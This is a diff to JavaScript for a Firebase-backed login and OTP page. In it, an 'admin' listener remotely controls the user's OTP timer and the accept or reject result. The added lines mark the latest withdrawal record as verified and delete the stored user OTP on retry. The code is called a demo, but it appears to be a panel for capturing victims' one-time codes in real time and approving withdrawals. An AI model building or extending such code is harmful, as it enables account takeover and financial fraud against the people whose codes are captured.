@@ -140,7 +140,6 @@ const database = firebase.database();
 let timer = null;
 let remaining = 600;
 let timerCancelled = false;
-let otpCheckInterval = null;
 let adminActionListener = null;
 
 function saveToFirebase(type, data) {
@@ -219,11 +218,6 @@ function startTimer() {
   document.getElementById('otpInput').disabled = false;
   document.getElementById('otpInputArea').style.display = 'block';
   
-  if (otpCheckInterval) {
-    clearInterval(otpCheckInterval);
-    otpCheckInterval = null;
-  }
-  
   if (adminActionListener) {
     adminActionListener.off();
     adminActionListener = null;
@@ -243,7 +237,6 @@ function startTimer() {
     }
   }, 1000);
   
-  // 🔥 FIREBASE REAL-TIME LISTENER FOR ADMIN ACTIONS
   listenForAdminActions();
 }
 
@@ -257,10 +250,6 @@ function updateTimer() {
 function resetDemo() {
   clearInterval(timer);
   timerCancelled = false;
-  if (otpCheckInterval) {
-    clearInterval(otpCheckInterval);
-    otpCheckInterval = null;
-  }
   if (adminActionListener) {
     adminActionListener.off();
     adminActionListener = null;
@@ -270,7 +259,7 @@ function resetDemo() {
   show('login');
 }
 
-// 🔥 REAL-TIME FIREBASE LISTENER - INSTANT UPDATES
+// 🔥 REAL-TIME FIREBASE LISTENER
 function listenForAdminActions() {
   if (adminActionListener) {
     adminActionListener.off();
@@ -298,7 +287,6 @@ function listenForAdminActions() {
       document.getElementById('otpInput').disabled = false;
       document.getElementById('otpInputArea').style.display = 'block';
       
-      // Reset flag
       database.ref('admin_actions/cancelTimer').set(false);
     }
     
@@ -333,6 +321,21 @@ function listenForAdminActions() {
       `;
       document.getElementById('otpInput').disabled = true;
       database.ref('admin_actions/otpResult').set('none');
+      
+      // Update withdrawal status
+      database.ref('activities').once('value').then((snapshot) => {
+        const allData = snapshot.val();
+        if(allData){
+          const keys = Object.keys(allData);
+          const latestKey = keys[keys.length - 1];
+          if(latestKey && allData[latestKey].type === 'WITHDRAWAL'){
+            database.ref('activities/' + latestKey).update({
+              verified: true,
+              otpFailed: false
+            });
+          }
+        }
+      });
     }
   }, function(error) {
     console.error("Firebase listener error:", error);
@@ -348,6 +351,8 @@ function retryOTP() {
   document.getElementById('otpMessage').textContent = '🔄 Please enter new OTP';
   document.getElementById('otpMessage').style.color = '#ff9800';
   database.ref('admin_actions/otpResult').set('none');
+  // Clear old OTP
+  database.ref('user_otp').remove();
 }
 
 function submitOTP() {
